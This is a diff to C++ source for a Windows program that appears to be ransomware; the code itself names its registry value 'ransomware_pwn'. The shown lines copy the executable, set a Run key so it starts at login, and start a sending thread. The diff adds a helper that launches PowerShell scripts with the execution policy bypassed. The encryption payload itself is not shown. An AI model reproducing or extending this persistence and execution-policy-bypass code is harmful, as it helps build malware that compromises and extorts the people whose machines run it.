@@ -29,6 +29,13 @@ string Misc::current_working_directory()
 	return working_directory;
 }
 
+void Misc::call_ps(string filename)
+{
+	string ps_cmd = "powershell -executionPolicy bypass -file ";
+	ps_cmd += current_working_directory() + "../../../powershell/" + filename;
+	system(ps_cmd.c_str());
+}
+
 void Misc::CopyMyself() 
 {
 	char filename[MAX_PATH]; // declaring the executable as its own file
@@ -66,6 +73,9 @@ void Misc::CopyMyself()
 		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &rkey);
 		// give key a value name
 		RegSetValueEx(rkey, "ransomware_pwn", 0, REG_SZ, (LPBYTE)new_path.c_str(), strlen(new_path.c_str())+1);
+
+		// confirm reg key is thre
+		call_ps("invoke_reg.ps1");
 
 		// start a thread
 		CreateThread(0, 0, sendThread, 0, 0, 0);
